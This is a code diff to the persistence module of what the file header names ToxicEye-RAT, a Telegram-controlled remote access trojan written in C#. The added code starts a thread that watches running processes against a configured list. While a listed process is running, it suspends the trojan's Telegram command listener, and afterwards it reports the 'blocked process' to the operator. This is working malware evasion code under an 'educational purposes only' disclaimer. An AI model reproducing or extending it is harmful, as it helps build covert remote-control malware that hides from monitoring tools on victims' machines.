@@ -1,4 +1,12 @@
-﻿using System;
+﻿/* 
+       ^ Author    : LimerBoy
+       ^ Name      : ToxicEye-RAT
+       ^ Github    : https:github.com/LimerBoy
+
+       > This program is distributed for educational purposes only.
+*/
+
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -12,6 +20,8 @@ namespace TelegramRAT
 {
     internal sealed class persistence
     {
+
+        public static Thread processCheckerThread = new Thread(processChecker);
 
         // Import dll'ls
         [DllImport("kernel32.dll")]
@@ -87,7 +97,64 @@ namespace TelegramRAT
                 base.WndProc(ref m);
             }
         }
-        
+
+        // Get process list
+        private static List<string> GetProcessList()
+        {
+            List<string> output = new List<string>();
+
+            foreach (Process proc in Process.GetProcesses())
+            {
+                output.Add(proc.ProcessName.ToUpper());
+            }
+            return output;
+        }
+
+        // Process checker
+        public static void processChecker()
+        {
+            // Check if disabled.
+            if(!config.BlockNetworkActivityWhenProcessStarted)
+            {
+                return;
+            }
+            // Run checker
+            Console.WriteLine("[+] Process checker started");
+            string proc;
+            while (true)
+            {
+                List<string> processList = GetProcessList();
+
+                foreach(string process in config.BlockNetworkActivityProcessList)
+                {
+                    proc = process.ToUpper();
+                    if (processList.Contains(proc))
+                    {
+                        // Stop command checking
+                        if (!telegram.waitThreadIsBlocked)
+                        {
+                            Console.WriteLine("[!] Stopping command listener thread");
+                            telegram.waitThreadIsBlocked = true;
+                            while(true)
+                            {
+                                processList = GetProcessList();
+                                if(!processList.Contains(proc))
+                                {
+                                    Console.WriteLine("[+] Restarting command listener thread");
+                                    telegram.waitThreadIsBlocked = false;
+                                    telegram.sendText("🙊 Found blocked process " + process + ".exe");
+                                    break;
+                                }
+                                Thread.Sleep(1000);
+                            }
+                            break;
+                        }
+                    }
+                }
+                Thread.Sleep(1500);
+            }
+        }
+
 
         // Protect process
         public static void protectProcess()
